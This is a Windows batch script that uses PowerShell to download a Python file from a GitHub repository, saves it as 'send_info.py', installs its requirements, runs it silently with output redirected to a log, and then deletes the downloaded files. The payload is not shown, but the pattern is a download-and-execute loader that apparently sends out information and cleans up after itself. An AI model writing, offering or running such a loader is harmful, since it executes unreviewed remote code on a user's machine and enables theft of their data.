@echo off
setlocal

:: Set the URLs for the Python script and requirements file
set "PYTHON_SCRIPT_URL=https://github.com/Koulner/exposed_bat/raw/refs/heads/main/python.py"
set "REQUIREMENTS_URL=https://github.com/Koulner/exposed_bat/raw/refs/heads/main/requirements.txt"

:: Download the Python script
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%PYTHON_SCRIPT_URL%', 'send_info.py')"
if %errorlevel% neq 0 (
    echo Failed to download send_info.py
    exit /b 1
)

:: Download the requirements.txt file
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%REQUIREMENTS_URL%', 'requirements.txt')"
if %errorlevel% neq 0 (
    echo Failed to download requirements.txt
    exit /b 1
)

:: Install the required Python packages
python -m pip install -r requirements.txt
if %errorlevel% neq 0 (
    echo Failed to install requirements
    exit /b 1
)

:: Sleep for 5 seconds to ensure installation is complete
timeout /t 6 /nobreak > NUL

:: Execute the Python script
python send_info.py > output.log 2>&1
if %errorlevel% neq 0 (
    echo Failed to execute send_info.py
    type output.log
    exit /b 1
)

:: Clean up the downloaded files
del send_info.py
del requirements.txt

echo Done.
endlocal
